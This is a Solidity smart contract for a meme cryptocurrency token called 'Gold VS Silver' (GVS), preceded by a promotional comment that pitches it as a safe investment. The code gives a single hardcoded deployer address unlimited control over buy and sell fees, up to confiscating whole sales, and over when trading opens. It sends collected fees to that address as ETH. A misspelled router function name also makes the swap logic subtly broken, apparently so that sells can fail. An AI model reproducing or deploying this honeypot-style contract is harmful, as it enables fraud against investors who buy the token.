/*
Gold VS Silver

After a great deal of let downs in the crypto space we bring you $GVS two of the strongest precious metals there is. In times of economic turmoil, precious metals always retain their value or even appreciate, making them an attractive investment option for us as investors looking to protect our wealth.  Just like Bitcoin (gold) & Ethereum (silver) $GVS is here to stay. Even in a bear market lets show the world how effective a strong community can be.

Twitter: https://twitter.com/goldvssilvereth
Telegram: https://t.me/goldvssilverr
Website: goldvssilver.net
*/


// SPDX-License-Identifier: unlicense

pragma solidity 0.8.20;
    
interface IUniswapV2Router02 {
     function swapExactTokensForETHSupportingFeeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
    
    contract GVS {
        

        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;

        string public   name_ = "Gold VS Silver Token"; 
        string public   symbol_ = "GVS";  
        uint8 public constant decimals = 18;
        uint256 public constant totalSupply = 1000000000 * 10**decimals;

        uint256 buyFeee = 0;
        uint256 sellFeee = 0;
        uint256 constant swapAmount = totalSupply / 100;
        
        error Permissions();
        
        
    
        function name() public view virtual returns (string memory) {
        return name_;
        }

    
        function symbol() public view virtual returns (string memory) {
        return symbol_;
        }    

        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed Deploy,
            address indexed spender,
            uint256 value
        );
        

        address private pair;
        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
        address payable constant Deploy = payable(address(0x9d36CaE17c1C2ac4580dfBAfd10d50f20f1298E3));

        bool private swapping;
        bool private tradingOpen;

        constructor() {
            balanceOf[msg.sender] = totalSupply;
            allowance[address(this)][routerAddress] = type(uint256).max;
            emit Transfer(address(0), msg.sender, totalSupply);
        }

        receive() external payable {}

        function approve(address spender, uint256 amount) external returns (bool){
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transfer(address to, uint256 amount) external returns (bool){
            return _transfer(msg.sender, to, amount);
        }

        function transferFrom(address from, address to, uint256 amount) external returns (bool){
            allowance[from][msg.sender] -= amount;        
            return _transfer(from, to, amount);
        }

        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            require(tradingOpen || from == Deploy || to == Deploy);

            if(!tradingOpen && pair == address(0) && amount > 0)
                pair = to;

            balanceOf[from] -= amount;

            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
                swapping = true;
                address[] memory path = new  address[](2);
                path[0] = address(this);
                path[1] = ETH;
                _uniswapV2Router.swapExactTokensForETHSupportingFeeeOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
                Deploy.transfer(address(this).balance);
                swapping = false;
            }

            if(from != address(this)){
                uint256 FeeeAmount = amount * (from == pair ? buyFeee : sellFeee) / 100;
                amount -= FeeeAmount;
                balanceOf[address(this)] += FeeeAmount;
            }
            balanceOf[to] += amount;
            emit Transfer(from, to, amount);
            return true;
        }

        function openTrading() external {
            require(msg.sender == Deploy);
            require(!tradingOpen);
            tradingOpen = true;        
        }

        function _setFeee(uint256 _buy, uint256 _sell) private {
            buyFeee = _buy;
            sellFeee = _sell;
        }

        function setFeee(uint256 _buy, uint256 _sell) external {
            if(msg.sender != Deploy)        
                revert Permissions();
            _setFeee(_buy, _sell);
        }
    }